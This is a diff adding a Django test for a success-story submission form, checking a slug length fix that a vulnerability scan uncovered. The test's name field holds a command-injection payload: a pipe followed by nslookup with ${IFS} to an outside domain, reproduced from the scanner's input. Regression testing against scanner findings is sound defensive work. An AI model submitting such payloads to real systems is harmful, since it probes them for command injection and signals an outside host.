@@ -175,3 +175,27 @@ class StoryViewTests(TestCase):
         response = self.client.post(url, post_data)
         self.assertEqual(response.status_code, 200)
         self.assertContains(response, 'Please use a unique name.')
+
+    def test_slug_field_max_length(self):
+        # name and slug fields come from NameSlugModel and their max_length
+        # attributes weren't equal. Default value of SlugField.max_length is
+        # 50 and since we set CharField.max_length to 200, we have to update
+        # SlugField.max_length as well. This was found by Netsparker and
+        # recorded by Sentry. See PYDOTORG-PROD-23 for details.
+        url = reverse('success_story_create')
+
+        post_data = {
+            'name': '|nslookup${IFS}"vprlkb-tutkaenivhxr1i4bxrdosuteo8wh4mb2r""cys.r87.me"',
+            'company_name': 'Company Three',
+            'company_url': 'http://djangopony.com/',
+            'category': self.category.pk,
+            'author': 'Kevin Arnold',
+            'author_email': 'kevin@arnold.com',
+            'pull_quote': 'Liver!',
+            'content': 'Growing up is never easy.\n\nFoo bar baz.\n',
+            settings.HONEYPOT_FIELD_NAME: settings.HONEYPOT_VALUE,
+        }
+
+        response = self.client.post(url, post_data)
+        self.assertEqual(response.status_code, 302)
+        self.assertRedirects(response, url)
